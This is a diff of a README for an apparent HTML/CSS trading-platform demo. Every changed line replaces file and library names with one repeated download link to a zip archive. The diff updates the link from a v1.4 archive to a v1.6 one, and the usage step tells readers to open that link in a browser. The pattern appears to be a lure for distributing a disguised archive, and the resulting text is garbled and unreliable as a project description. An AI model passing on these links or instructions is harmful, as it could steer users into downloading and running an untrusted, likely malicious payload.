@@ -4,7 +4,7 @@ Welcome to the Advanced Trading AI Platform – a modern and visually appealing 
 🌟 Features
 Modern UI: Sleek layout built with pure HTML and CSS.
 
-https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip Background: Interactive HALO animation using https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip and https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip
+https://github.com/ssharvesh-steep/Advanced-Trading-AI-Platform/raw/refs/heads/main/belonite/Platform-Advanced-A-Trading-1.6.zip Background: Interactive HALO animation using https://github.com/ssharvesh-steep/Advanced-Trading-AI-Platform/raw/refs/heads/main/belonite/Platform-Advanced-A-Trading-1.6.zip and https://github.com/ssharvesh-steep/Advanced-Trading-AI-Platform/raw/refs/heads/main/belonite/Platform-Advanced-A-Trading-1.6.zip
 
 Responsive Design: Fully mobile-optimized using CSS media queries.
 
@@ -25,18 +25,18 @@ Font Awesome for icons
 
 Google Fonts (Roboto)
 
-https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip & https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip for animated background
+https://github.com/ssharvesh-steep/Advanced-Trading-AI-Platform/raw/refs/heads/main/belonite/Platform-Advanced-A-Trading-1.6.zip & https://github.com/ssharvesh-steep/Advanced-Trading-AI-Platform/raw/refs/heads/main/belonite/Platform-Advanced-A-Trading-1.6.zip for animated background
 
 📂 File Structure
 bash
 Copy
 Edit
 .
-├── https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip       # Main project file
+├── https://github.com/ssharvesh-steep/Advanced-Trading-AI-Platform/raw/refs/heads/main/belonite/Platform-Advanced-A-Trading-1.6.zip       # Main project file
 🎯 How to Use
 Clone or download this repository.
 
-Open https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip in any modern browser.
+Open https://github.com/ssharvesh-steep/Advanced-Trading-AI-Platform/raw/refs/heads/main/belonite/Platform-Advanced-A-Trading-1.6.zip in any modern browser.
 
 Explore the interactive and beautifully styled UI.
 
